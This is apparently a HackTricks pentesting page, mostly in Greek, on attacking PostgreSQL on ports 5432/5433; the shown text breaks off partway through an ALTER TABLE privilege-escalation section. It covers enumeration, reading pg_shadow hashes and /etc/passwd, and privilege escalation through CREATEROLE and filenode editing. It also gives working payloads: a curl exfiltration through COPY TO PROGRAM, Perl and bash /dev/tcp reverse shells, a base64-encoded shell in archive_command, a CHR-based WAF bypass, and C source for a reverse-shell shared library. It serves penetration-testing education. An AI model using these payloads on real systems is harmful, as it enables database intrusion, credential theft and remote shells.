# 5432,5433 - Pentesting Postgresql

{{#include ../banners/hacktricks-training.md}}

## **Βασικές Πληροφορίες**

**PostgreSQL** περιγράφεται ως ένα **αντικειμενοσχεσιακό σύστημα βάσης δεδομένων** που είναι **ανοιχτού κώδικα**. Αυτό το σύστημα όχι μόνο χρησιμοποιεί τη γλώσσα SQL αλλά την επεκτείνει με επιπλέον δυνατότητες. Οι δυνατότητές του του επιτρέπουν να χειρίζεται ένα μεγάλο εύρος τύπων δεδομένων και λειτουργιών, καθιστώντας το μια ευέλικτη επιλογή για προγραμματιστές και οργανισμούς.

**Προεπιλεγμένη θύρα:** 5432, και αν αυτή η θύρα είναι ήδη σε χρήση φαίνεται ότι ο postgresql θα χρησιμοποιήσει την επόμενη θύρα (πιθανώς 5433) που δεν είναι σε χρήση.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Σύνδεση & Βασική Αναγνώριση
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> Αν κατά την εκτέλεση του **`\list`** βρείτε μια database με το όνομα **`rdsadmin`**, γνωρίζετε ότι βρίσκεστε μέσα σε μια **AWS postgresql database**.

Για περισσότερες πληροφορίες σχετικά με το **πώς να εκμεταλλευτείτε μια PostgreSQL database**, δείτε:


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## Αυτόματη Εντοπισμός
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-hacking/brute-force.md#postgresql)

### **Port scanning**

Σύμφωνα με [**this research**](https://www.exploit-db.com/papers/13084), όταν μια προσπάθεια σύνδεσης αποτυγχάνει, `dblink` προκαλεί την εξαίρεση `sqlclient_unable_to_establish_sqlconnection` που περιλαμβάνει εξήγηση του σφάλματος. Παραδείγματα αυτών των λεπτομερειών παρατίθενται παρακάτω.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- Host είναι εκτός λειτουργίας

`DETAIL: could not connect to server: No route to host Is the server running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?`

- Port είναι κλειστή
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- Port είναι ανοιχτό
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
ή
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- Η θύρα είναι ανοιχτή ή φιλτραρισμένη
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
Στις συναρτήσεις PL/pgSQL, προς το παρόν δεν είναι δυνατόν να ληφθούν λεπτομέρειες εξαιρέσεων. Ωστόσο, αν έχετε άμεση πρόσβαση στον PostgreSQL server, μπορείτε να ανακτήσετε τις απαραίτητες πληροφορίες. Αν η εξαγωγή ονομάτων χρήστη και κωδικών από τους πίνακες συστήματος δεν είναι εφικτή, μπορείτε να εξετάσετε τη χρήση της wordlist attack μεθόδου που συζητήθηκε στην προηγούμενη ενότητα, καθώς ενδεχομένως να αποφέρει θετικά αποτελέσματα.

## Απαρίθμηση Δικαιωμάτων

### Ρόλοι

| Role Types     |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Ο ρόλος έχει προνόμια superuser                                                                                                                      |
| rolinherit     | Ο ρόλος κληρονομεί αυτόματα τα προνόμια των ρόλων των οποίων είναι μέλος                                                                              |
| rolcreaterole  | Ο ρόλος μπορεί να δημιουργήσει περισσότερους ρόλους                                                                                                   |
| rolcreatedb    | Ο ρόλος μπορεί να δημιουργήσει βάσεις δεδομένων                                                                                                      |
| rolcanlogin    | Ο ρόλος μπορεί να συνδεθεί. Δηλαδή, αυτός ο ρόλος μπορεί να δοθεί ως το αρχικό αναγνωριστικό εξουσιοδότησης της συνεδρίας                            |
| rolreplication | Ο ρόλος είναι replication role. Ένας τέτοιος ρόλος μπορεί να ξεκινήσει replication συνδέσεις και να δημιουργήσει και να διαγράψει replication slots.   |
| rolconnlimit   | Για ρόλους που μπορούν να συνδεθούν, αυτό ορίζει τον μέγιστο αριθμό ταυτόχρονων συνδέσεων που μπορεί να κάνει ο ρόλος. -1 σημαίνει χωρίς όριο.          |
| rolpassword    | Όχι ο κωδικός (πάντα εμφανίζεται ως `********`)                                                                                                       |
| rolvaliduntil  | Χρόνος λήξης κωδικού (χρησιμοποιείται μόνο για έλεγχο ταυτότητας με κωδικό); null αν δεν υπάρχει λήξη                                                 |
| rolbypassrls   | Ο ρόλος παρακάμπτει κάθε πολιτική row-level security, δείτε [Section 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) για περισσότερες πληροφορίες. |
| rolconfig      | Προεπιλογές ανά ρόλο για μεταβλητές διαμόρφωσης κατά την εκτέλεση                                                                                     |
| oid            | ID του ρόλου                                                                                                                                         |

#### Ενδιαφέρουσες Ομάδες

- Εάν είστε μέλος του **`pg_execute_server_program`** μπορείτε να **εκτελέσετε** προγράμματα
- Εάν είστε μέλος του **`pg_read_server_files`** μπορείτε να **διαβάσετε** αρχεία
- Εάν είστε μέλος του **`pg_write_server_files`** μπορείτε να **γράψετε** αρχεία

> [!TIP]
> Σημειώστε ότι στο Postgres ένας **user**, μια **group** και ένας **role** είναι το **ίδιο**. Εξαρτάται απλώς από **πώς το χρησιμοποιείτε** και αν **επιτρέπετε να συνδεθεί**.
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Πίνακες
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Συναρτήσεις
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Ενέργειες στο σύστημα αρχείων

### Ανάγνωση καταλόγων και αρχείων

Από αυτό το [**commit** ](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) τα μέλη της ορισμένης ομάδας **`DEFAULT_ROLE_READ_SERVER_FILES`** (που ονομάζεται **`pg_read_server_files`**) και οι **super users** μπορούν να χρησιμοποιήσουν τη μέθοδο **`COPY`** σε οποιοδήποτε path (δείτε `convert_and_check_filename` στο `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> Θυμηθείτε ότι αν δεν είστε super user αλλά έχετε τα δικαιώματα **CREATEROLE**, μπορείτε να **κάνετε τον εαυτό σας μέλος αυτής της ομάδας:** 
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
 
Υπάρχουν **άλλες postgres functions** που μπορούν να χρησιμοποιηθούν για να **διαβάσουν αρχείο ή να απαριθμήσουν έναν κατάλογο**. Μόνο **superusers** και **χρήστες με ρητά δικαιώματα** μπορούν να τις χρησιμοποιήσουν:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Μπορείτε να βρείτε **περισσότερες συναρτήσεις** στο [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Απλή εγγραφή αρχείων

Μόνο **super users** και μέλη του **`pg_write_server_files`** μπορούν να χρησιμοποιήσουν copy για να γράψουν αρχεία.
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> Θυμηθείτε ότι αν δεν είστε super user αλλά έχετε τα δικαιώματα **`CREATEROLE`** μπορείτε να **κάνετε τον εαυτό σας μέλος αυτής της ομάδας:** 
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**Περισσότερες πληροφορίες.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Θυμηθείτε ότι το COPY δεν μπορεί να χειριστεί χαρακτήρες νέας γραμμής, επομένως ακόμη και αν χρησιμοποιείτε payload base64 **πρέπει να στείλετε μια μονή γραμμή**.\\
Μια πολύ σημαντική περιορισμός αυτής της τεχνικής είναι ότι **`copy` δεν μπορεί να χρησιμοποιηθεί για την εγγραφή binary αρχείων καθώς τροποποιεί κάποιες binary τιμές.**

### **Binary files upload**

Ωστόσο, υπάρχουν **άλλες τεχνικές για την μεταφόρτωση μεγάλων binary αρχείων:**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}



### Ενημέρωση δεδομένων πίνακα PostgreSQL μέσω τοπικής εγγραφής αρχείου

Εάν έχετε τα απαραίτητα δικαιώματα για ανάγνωση και εγγραφή αρχείων του PostgreSQL server, μπορείτε να ενημερώσετε οποιονδήποτε πίνακα στον server με την **υπεργραφή του αντίστοιχου filenode** στον [κατάλογο δεδομένων του PostgreSQL](https://www.postgresql.org/docs/8.1/storage.html). **Περισσότερα για αυτήν την τεχνική** [**εδώ**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Απαιτούμενα βήματα:

1.  Βρείτε τον κατάλογο δεδομένων του PostgreSQL

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Σημείωση:** Αν δεν μπορείτε να ανακτήσετε το τρέχον μονοπάτι καταλόγου δεδομένων από τα settings, μπορείτε να ερωτήσετε την κύρια έκδοση του PostgreSQL μέσω του ερωτήματος `SELECT version()` και να προσπαθήσετε να brute-force το μονοπάτι. Συνήθη μονοπάτια καταλόγου δεδομένων σε Unix εγκαταστάσεις του PostgreSQL είναι `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. Ένα κοινό όνομα cluster είναι `main`.

2.  Λάβετε ένα σχετικό μονοπάτι προς το filenode που σχετίζεται με τον στοχευόμενο πίνακα

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

Αυτό το ερώτημα θα πρέπει να επιστρέψει κάτι σαν `base/3/1337`. Το πλήρες μονοπάτι στο δίσκο θα είναι `$DATA_DIRECTORY/base/3/1337`, δηλ. `/var/lib/postgresql/13/main/base/3/1337`.

3.  Κατεβάστε το filenode μέσω των συναρτήσεων `lo_*`

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  Πάρτε τον τύπο δεδομένων που σχετίζεται με τον στοχευόμενο πίνακα

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  Χρησιμοποιήστε τον [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) για να [επεξεργαστείτε το filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); ορίστε όλα τα boolean flags `rol*` σε 1 για πλήρη δικαιώματα.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor Demo](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  Ανεβάστε ξανά το επεξεργασμένο filenode μέσω των συναρτήσεων `lo_*`, και αντικαταστήστε το αρχικό αρχείο στον δίσκο

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(Προαιρετικά)_ Καθαρίστε την cache των πινάκων στη μνήμη εκτελώντας ένα κοστοβόρο SQL query

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  Τώρα θα πρέπει να δείτε ενημερωμένες τιμές πινάκων στο PostgreSQL.

Μπορείτε επίσης να γίνετε superadmin επεξεργαζόμενοι τον πίνακα `pg_authid`. **Δείτε** [**την ακόλουθη ενότητα**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE σε πρόγραμμα**

Από [έκδοση 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), μόνο **super users** και μέλη της ομάδας **`pg_execute_server_program`** μπορούν να χρησιμοποιήσουν copy για RCE (παράδειγμα με exfiltration:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Παράδειγμα για exec:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> Θυμήσου ότι αν δεν είσαι super user αλλά έχεις τα δικαιώματα **`CREATEROLE`** μπορείς **να γίνεις μέλος αυτής της ομάδας:**
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Or use the `multi/postgres/postgres_copy_from_program_cmd_exec` module from **metasploit**.\
More information about this vulnerability [**here**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). While reported as CVE-2019-9193, Postges declared this was a [feature and will not be fixed](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

#### Παράκαμψη φίλτρων λέξεων-κλειδιών/WAF για πρόσβαση στο COPY PROGRAM

Σε περιβάλλοντα SQLi με stacked queries, ένα WAF μπορεί να αφαιρέσει ή να μπλοκάρει τη literal λέξη-κλειδί `COPY`. Μπορείς να κατασκευάσεις δυναμικά την εντολή και να την εκτελέσεις μέσα σε ένα PL/pgSQL DO block. Για παράδειγμα, κατασκεύασε το αρχικό C με `CHR(67)` για να παρακάμψεις επιπόλαια φίλτρα και EXECUTE την συναρμολογημένη εντολή:
```sql
DO $$
DECLARE cmd text;
BEGIN
cmd := CHR(67) || 'OPY (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"''';
EXECUTE cmd;
END $$;
```
This pattern avoids static keyword filtering and still achieves OS command execution via `COPY ... PROGRAM`. It is especially useful when the application echoes SQL errors and allows stacked queries.

### RCE with PostgreSQL Languages


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### RCE with PostgreSQL extensions

Once you have **learned** from the previous post **how to upload binary files** you could try obtain **RCE uploading a postgresql extension and loading it**.


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### PostgreSQL configuration file RCE

> [!TIP]
> Τα παρακάτω RCE vectors είναι ιδιαίτερα χρήσιμα σε περιορισμένα SQLi περιβάλλοντα, καθώς όλα τα βήματα μπορούν να εκτελεστούν μέσω nested SELECT statements

The **configuration file** of PostgreSQL is **writable** by the **postgres user**, which is the one running the database, so as **superuser**, you can write files in the filesystem, and therefore you can **overwrite this file.**

![](<../images/image (322).png>)

#### **RCE with ssl_passphrase_command**

More information [about this technique here](https://pulsesecurity.co.nz/articles/postgres-sqli).

The configuration file have some interesting attributes that can lead to RCE:

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Path to the private key of the database
- `ssl_passphrase_command = ''` If the private file is protected by password (encrypted) postgresql will **execute the command indicated in this attribute**.
- `ssl_passphrase_command_supports_reload = off` **If** this attribute is **on** the **command** executed if the key is protected by password **will be executed** when `pg_reload_conf()` is **executed**.

Then, an attacker will need to:

1. **Dump private key** from the server
2. **Encrypt** downloaded private key:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Overwrite**
4. **Dump** the current postgresql **configuration**
5. **Overwrite** the **configuration** with the mentioned attributes configuration:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Execute `pg_reload_conf()`

While testing this I noticed that this will only work if the **private key file has privileges 640**, it's **owned by root** and by the **group ssl-cert or postgres** (so the postgres user can read it), and is placed in _/var/lib/postgresql/12/main_.

#### **RCE with archive_command**

**More** [**information about this config and about WAL here**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Another attribute in the configuration file that is exploitable is `archive_command`.

For this to work, the `archive_mode` setting has to be `'on'` or `'always'`. If that is true, then we could overwrite the command in `archive_command` and force it to execute via the WAL (write-ahead logging) operations.

The general steps are:

1. Check whether archive mode is enabled: `SELECT current_setting('archive_mode')`
2. Overwrite `archive_command` with the payload. For eg, a reverse shell: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RISU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Reload the config: `SELECT pg_reload_conf()`
4. Force the WAL operation to run, which will call the archive command: `SELECT pg_switch_wal()` or `SELECT pg_switch_xlog()` for some Postgres versions

##### Editing postgresql.conf via Large Objects (SQLi-friendly)

When multi-line writes are needed (e.g., to set multiple GUCs), use PostgreSQL Large Objects to read and overwrite the config entirely from SQL. This approach is ideal in SQLi contexts where `COPY` cannot handle newlines or binary-safe writes.

Example (adjust the major version and path if needed, e.g. version 15 on Debian):
```sql
-- 1) Import the current configuration and note the returned OID (example OID: 114575)
SELECT lo_import('/etc/postgresql/15/main/postgresql.conf');

-- 2) Read it back as text to verify
SELECT encode(lo_get(114575), 'escape');

-- 3) Prepare a minimal config snippet locally that forces execution via WAL
--    and base64-encode its contents, for example:
--    archive_mode = 'always'\n
--    archive_command = 'bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"'\n
--    archive_timeout = 1\n
--    Then write the new contents into a new Large Object and export it over the original file
SELECT lo_from_bytea(223, decode('<BASE64_POSTGRESQL_CONF>', 'base64'));
SELECT lo_export(223, '/etc/postgresql/15/main/postgresql.conf');

-- 4) Reload the configuration and optionally trigger a WAL switch
SELECT pg_reload_conf();
-- Optional explicit trigger if needed
SELECT pg_switch_wal();  -- or pg_switch_xlog() on older versions
```
Αυτό οδηγεί σε αξιόπιστη εκτέλεση εντολών OS μέσω του `archive_command` ως ο χρήστης `postgres`, υπό την προϋπόθεση ότι το `archive_mode` είναι ενεργοποιημένο. Στην πράξη, η ρύθμιση ενός μικρού `archive_timeout` μπορεί να προκαλέσει ταχεία κλήση χωρίς να απαιτείται ρητή εναλλαγή WAL.

#### **RCE with preload libraries**

Περισσότερες πληροφορίες [about this technique here](https://adeadfed.com/posts/postgresql-select-only-rce/).

Αυτός ο άξονας επίθεσης εκμεταλλεύεται τις ακόλουθες μεταβλητές ρύθμισης:

- `session_preload_libraries` -- βιβλιοθήκες που θα φορτωθούν από τον PostgreSQL server κατά τη σύνδεση του client.
- `dynamic_library_path` -- λίστα καταλόγων όπου ο PostgreSQL server θα ψάξει για τις βιβλιοθήκες.

Μπορούμε να ορίσουμε την τιμή `dynamic_library_path` σε έναν κατάλογο εγγράψιμο από τον χρήστη `postgres` που τρέχει τη βάση δεδομένων, π.χ. τον κατάλογο `/tmp/`, και να ανεβάσουμε εκεί ένα κακόβουλο αντικείμενο `.so`. Στη συνέχεια, θα αναγκάσουμε τον PostgreSQL server να φορτώσει τη νεοανεβασμένη βιβλιοθήκη μας συμπεριλαμβάνοντάς την στην μεταβλητή `session_preload_libraries`.

Τα βήματα της επίθεσης είναι:

1. Κατέβασμα του αρχικού `postgresql.conf`
2. Συμπερίληψη του καταλόγου `/tmp/` στην τιμή `dynamic_library_path`, π.χ. `dynamic_library_path = '/tmp:$libdir'`
3. Συμπερίληψη του ονόματος της κακόβουλης βιβλιοθήκης στην τιμή `session_preload_libraries`, π.χ. `session_preload_libraries = 'payload.so'`
4. Έλεγχος της κύριας έκδοσης PostgreSQL μέσω του query `SELECT version()`
5. Compile του κακόβουλου κώδικα βιβλιοθήκης με το σωστό PostgreSQL dev package. Sample code:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Compiling the code:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. Ανέβασμα του κακόβουλου `postgresql.conf`, που δημιουργήθηκε στα βήματα 2-3, και αντικατάσταση του αρχικού
7. Ανέβασμα του `payload.so` από το βήμα 5 στον κατάλογο `/tmp`
8. Επαναφόρτωση της ρύθμισης του server κάνοντας επανεκκίνηση του server ή καλώντας το query `SELECT pg_reload_conf()`
9. Στην επόμενη σύνδεση στη DB, θα λάβετε τη σύνδεση reverse shell.

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Χορήγηση**

Σύμφωνα με τα [**docs**](https://www.postgresql.org/docs/13/sql-grant.html): _Ρόλοι που έχουν το προνόμιο **`CREATEROLE`** μπορούν να **χορηγούν ή να ανακαλούν τη συμμετοχή σε οποιονδήποτε ρόλο** που **δεν** είναι **superuser**._

Έτσι, εάν έχετε την άδεια **`CREATEROLE`** θα μπορούσατε να χορηγήσετε στον εαυτό σας πρόσβαση σε άλλους **ρόλους** (που δεν είναι superuser) οι οποίοι μπορούν να σας δώσουν τη δυνατότητα να διαβάζετε & να γράφετε αρχεία και να εκτελείτε εντολές:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Αλλαγή Password

Οι χρήστες με αυτόν τον ρόλο μπορούν επίσης να **αλλάξουν** τα **passwords** άλλων **non-superusers**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc to SUPERUSER

Είναι αρκετά συνηθισμένο να διαπιστώσετε ότι οι **local users μπορούν να login στο PostgreSQL χωρίς να παρέχουν κάποιο password**. Επομένως, μόλις έχετε συγκεντρώσει **permissions to execute code**, μπορείτε να καταχραστείτε αυτά τα δικαιώματα για να σας χορηγήσουν το ρόλο **`SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!TIP]
> Αυτό είναι συνήθως δυνατό εξαιτίας των παρακάτω γραμμών στο αρχείο **`pg_hba.conf`**:
>
> ```bash
> # "local" is for Unix domain socket connections only
> local   all             all                                     trust
> # IPv4 local connections:
> host    all             all             127.0.0.1/32            trust
> # IPv6 local connections:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

Στο [**this writeup**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) εξηγείται πώς ήταν δυνατό να γίνει **privesc** σε Postgres GCP εκμεταλλευόμενοι το προνόμιο ALTER TABLE που είχε παραχωρηθεί στον χρήστη.

Όταν προσπαθείς να **κάνεις έναν άλλο χρήστη ιδιοκτήτη ενός πίνακα** θα πρέπει να λάβεις ένα **σφάλμα** που το αποτρέπει, αλλά προφανώς η GCP έδωσε αυτήν την **επιλογή στον μη-superuser χρήστη postgres** στην GCP:

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

Συνδυάζοντας αυτή την ιδέα με το γεγονός ότι όταν οι εντολές **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) εκτελούνται σε έναν **πίνακα με μια index function**, η **function** καλείται ως μέρος της εντολής με τα δικαιώματα του **ιδιοκτήτη του πίνακα**. Είναι δυνατό να δημιουργήσεις ένα index με μια function και να δώσεις δικαιώματα ιδιοκτησίας σε έναν **super user** για αυτόν τον πίνακα, και στη συνέχεια να τρέξεις ANALYZE στον πίνακα με τη κακόβουλη function που θα μπορέσει να εκτελέσει εντολές επειδή χρησιμοποιεί τα προνόμια του ιδιοκτήτη.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Εκμετάλλευση

1. Ξεκινήστε δημιουργώντας έναν νέο πίνακα.
2. Εισάγετε κάποιο άσχετο περιεχόμενο στον πίνακα για να παρέχετε δεδομένα στη συνάρτηση ευρετηρίου.
3. Αναπτύξτε μια κακόβουλη συνάρτηση ευρετηρίου που περιέχει ένα payload εκτέλεσης κώδικα, επιτρέποντας την εκτέλεση μη εξουσιοδοτημένων εντολών.
4. ALTER τον ιδιοκτήτη του πίνακα σε "cloudsqladmin", ο οποίος είναι ο superuser ρόλος του GCP που χρησιμοποιείται αποκλειστικά από το Cloud SQL για τη διαχείριση και συντήρηση της βάσης δεδομένων.
5. Εκτελέστε μια λειτουργία ANALYZE στον πίνακα. Αυτή η ενέργεια αναγκάζει την engine του PostgreSQL να αλλάξει στο user context του ιδιοκτήτη του πίνακα, "cloudsqladmin". Κατά συνέπεια, η κακόβουλη συνάρτηση ευρετηρίου καλείται με τα permissions του "cloudsqladmin", επιτρέποντας έτσι την εκτέλεση του προηγουμένως μη εξουσιοδοτημένου shell command.

Σε PostgreSQL, αυτή η ροή μοιάζει κάπως έτσι:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

